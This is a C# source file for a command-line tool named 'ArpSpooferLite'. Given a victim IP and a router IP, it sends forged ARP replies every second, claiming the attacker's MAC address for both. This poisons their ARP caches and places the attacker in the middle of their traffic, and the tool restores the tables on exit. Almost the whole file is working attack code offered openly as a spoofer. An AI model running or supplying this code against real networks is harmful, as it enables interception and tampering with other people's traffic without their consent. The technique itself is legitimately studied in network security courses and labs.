using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;

namespace ArpSpooferLite
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            Console.WriteLine("ARP Spoofer Lite");
            Console.WriteLine("This is a simple ARP spoofer tool.");
            // Check if the user has provided the necessary arguments
            if (args.Length < 2)
            {
                Console.WriteLine("Usage: ArpSpooferLite.exe <victim IP> <router IP>");
                return;
            }
            string victimIp = args[0];
            string routerIp = args[1];

            //NOTE: Arp spoofing usage: Spoof Router IP to Target IP and Spoof Target IP to Router IP

            //use ping -4 
            string hostName = Dns.GetHostName();
            string attackerIp = Dns.GetHostEntry(hostName).AddressList.FirstOrDefault(ip => ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork).ToString();
            string attackerMac = GetHostMac();

            Console.WriteLine("Attacker IP : " + attackerIp);
            Console.WriteLine("Attacker Mac : " + attackerMac);

            string victimMac = GetMacByIp(victimIp);
            Console.WriteLine("\nVictim Ip : " + victimIp); // TODO: change to targetIp
            Console.WriteLine("Victim Mac : " + victimMac);

            string routerMac = GetMacByIp(routerIp);
            Console.WriteLine("\nRouter Ip : " + routerIp);
            Console.WriteLine("Router Mac : " + victimMac);

            LibPcapLiveDevice device = LibPcapLiveDeviceList.Instance.FirstOrDefault(d => d.Addresses.Any(a => a.Addr.ipAddress != null && a.Addr.ipAddress.ToString() == attackerIp));

            // Press Q to quit the program and restore the ARP tables of the victim and router.
            while (Console.ReadKey().Key != ConsoleKey.Q)
            {
                SpoofArpReply(victimIp, victimMac, routerIp, routerMac, attackerIp, attackerMac, device);
                Thread.Sleep(1000);
            }

            for (int i = 0; i < 7; i++)
            {
                restoreArpTables(victimIp, victimMac, routerIp, routerMac, attackerIp, attackerMac, device);
                Thread.Sleep(1000);
            }
        }

        /// <summary>
        /// Gets the MAC address of a device given its IP address by pinging it and checking the ARP cache (retrieving the output of the process "arp -a").
        /// </summary>
        /// <param name="ip">given ip adress to retrieve MAC Adress.</param>
        /// <returns>MAC address of the device, or null if not found.</returns>
        private static string? GetMacByIp(string ip)
        {
            PingOptions pingOption = new PingOptions()
            {
                DontFragment = false
            };

            // Ipv4 uses 32 byte long pings and Ipv6 uses () so we force to ping in ipv4. TODO: correct it.
            byte[] buffer = new byte[32];

            // Ping the target IP to ensure it's reachable and to populate the ARP cache
            try
            {
                PingReply reply = new System.Net.NetworkInformation.Ping().Send(ip, 500, buffer, pingOption);

                if (reply.Status != IPStatus.Success)
                {
                    Console.WriteLine("Ping failed! Status: " + reply.Status);
                    return null;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Something went wrong!: " + ex.Message);
                return null;
            }

            Process process = new System.Diagnostics.Process();
            process.StartInfo.FileName = "arp";
            process.StartInfo.Arguments = "-a " + ip;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();

            //Console.WriteLine(output); *Debug purpose*

            process.WaitForExit();

            foreach (string line in output.Split('\n'))
            {
                if (line.Contains(ip))
                {
                    string[] parts = line.Split(' ', StringSplitOptions.RemoveEmptyEntries);

                    if (parts.Length >= 2)
                        return parts[1];
                }
            }

            return null;
        }

        /// <summary>
        /// Gets Host Mac Address from the Network Interfaces. By searching for the first interface that is up and has a gateway and an IPv4 address.
        /// </summary>
        /// <returns>Host MAC address, or null if not found.</returns>
        private static string GetHostMac()
        {
            string hostmac = null;

            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.OperationalStatus != OperationalStatus.Up)
                {
                    continue;
                }

                IPInterfaceProperties props = nic.GetIPProperties();

                bool hasIPv4 = props.UnicastAddresses.Any(ip => ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork);

                bool hasGateWay = props.GatewayAddresses.Any(g => g.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork);

                if (hasIPv4 && hasGateWay)
                {
                    return BitConverter.ToString(nic.GetPhysicalAddress().GetAddressBytes());
                }
            }

            return null;
        }

        /// <summary>
        /// Sends an ARP reply to the victim and router, spoofing the MAC address of the attacker. Using the SharpPcap library to send the ARP packets.
        /// </summary>
        /// <param name="victimIp">victims ip.</param>
        /// <param name="victimMac">victims mac.</param>
        /// <param name="routerIp">routers ip.</param>
        /// <param name="routerMac">routers mac.</param>
        /// <param name="attackerIp">attackers ip.</param>
        /// <param name="attackerMac">attackers mac.</param>
        private static void SpoofArpReply(string victimIp, string? victimMac, string routerIp, string? routerMac, string attackerIp, string attackerMac, LibPcapLiveDevice device)
        {
            PhysicalAddress attackerMacAddress = PhysicalAddress.Parse(attackerMac.Replace("-", ""));
            PhysicalAddress victimMacAddress = PhysicalAddress.Parse(victimMac.Replace("-", ""));
            PhysicalAddress routerMacAddress = PhysicalAddress.Parse(routerMac.Replace("-", ""));

            IPAddress victimIpAddress = IPAddress.Parse(victimIp);
            IPAddress routerIpAddress = IPAddress.Parse(routerIp);

            // Build ARP reply (attacker pretends to be the router for the victim)
            ArpPacket arp = new PacketDotNet.ArpPacket
                (
                PacketDotNet.ArpOperation.Response,
                victimMacAddress,
                victimIpAddress,
                attackerMacAddress,
                routerIpAddress
                );

            // Build ethernet frame (build ethernet frame with router mac as source and victim mac as destination)
            EthernetPacket ethernet = new PacketDotNet.EthernetPacket
                (
                attackerMacAddress,
                victimMacAddress,
                PacketDotNet.EthernetType.Arp
                );

            ethernet.PayloadPacket = arp;

            // Build ARP reply (attacker pretends to be the victim for the router)
            ArpPacket arp2 = new PacketDotNet.ArpPacket
                (
                PacketDotNet.ArpOperation.Response,
                routerMacAddress,
                routerIpAddress,
                attackerMacAddress,
                victimIpAddress
                );

            // Build ethernet frame for the second ARP reply
            EthernetPacket ethernet2 = new PacketDotNet.EthernetPacket
                (
                attackerMacAddress,
                routerMacAddress,
                PacketDotNet.EthernetType.Arp
                );

            ethernet2.PayloadPacket = arp2;

            device.Open();
            device.SendPacket(ethernet);
            Console.WriteLine("Sent ARP reply to (victim ip): [" + victimIp + "] claiming that (router ip) [" + routerIp + "] is at (attackers mac) [" + attackerMac + "]");
            device.SendPacket(ethernet2);
            Console.WriteLine("Sent ARP reply to (router ip): [" + routerIp + "] claiming that (victim ip) [" + victimIp + "] is at (attackers mac) [" + attackerMac + "]");
            device.Close();
        }

        /// <summary>
        /// Restores the ARP tables of the victim and router by sending correct ARP replies to both, using the SharpPcap library to send the ARP packets.
        /// </summary>
        /// <param name="victimIp">victims ip.</param>
        /// <param name="victimMac">victims mac.</param>
        /// <param name="routerIp">routers ip.</param>
        /// <param name="routerMac">routers mac.</param>
        /// <param name="attackerIp">attackers ip.</param>
        /// <param name="attackerMac">attackers mac.</param>
        /// <param name="device">the pcap device to send the packets through.</param>
        /// <exception cref="NotImplementedException"></exception>
        private static void restoreArpTables(string victimIp, string victimMac, string routerIp, string routerMac, string attackerIp, string attackerMac, LibPcapLiveDevice device)
        {
            PhysicalAddress attackerMacAddress = PhysicalAddress.Parse(attackerMac.Replace("-", ""));
            PhysicalAddress victimMacAddress = PhysicalAddress.Parse(victimMac.Replace("-", ""));
            PhysicalAddress routerMacAddress = PhysicalAddress.Parse(routerMac.Replace("-", ""));

            IPAddress victimIpAddress = IPAddress.Parse(victimIp);
            IPAddress routerIpAddress = IPAddress.Parse(routerIp);
            IPAddress attackerIpAddress = IPAddress.Parse(attackerIp);

            // Build ARP reply (restoring correct mappings between victim and router)
            ArpPacket arp = new PacketDotNet.ArpPacket
                (
                PacketDotNet.ArpOperation.Response,
                victimMacAddress,
                victimIpAddress,
                routerMacAddress,
                routerIpAddress
                );

            // Build ethernet frame ()
            EthernetPacket ethernet = new PacketDotNet.EthernetPacket
                (
                routerMacAddress,
                victimMacAddress,
                PacketDotNet.EthernetType.Arp
                );

            ethernet.PayloadPacket = arp;

            // Build ARP reply (restoring correct mapping between router and victim)
            ArpPacket arp2 = new PacketDotNet.ArpPacket
                (
                PacketDotNet.ArpOperation.Response,
                routerMacAddress,
                routerIpAddress,
                victimMacAddress,
                victimIpAddress
                );

            // Build ethernet frame for the second ARP reply
            EthernetPacket ethernet2 = new PacketDotNet.EthernetPacket
                (
                victimMacAddress,
                routerMacAddress,
                PacketDotNet.EthernetType.Arp
                );

            ethernet2.PayloadPacket = arp2;

            device.Open();
            device.SendPacket(ethernet);
            Console.WriteLine("Restoring Arp Packets (victim ip) is: [" + victimIp + "] (router ip) [" + routerIp + "] is at (router mac) [" + routerMac + "]");
            device.SendPacket(ethernet2);
            Console.WriteLine("Restoring Arp Packets (router ip) is: [" + routerIp + "] (victim ip) [" + victimIp + "] is at (victim mac) [" + victimMac + "]");
            device.Close();
        }
    }
}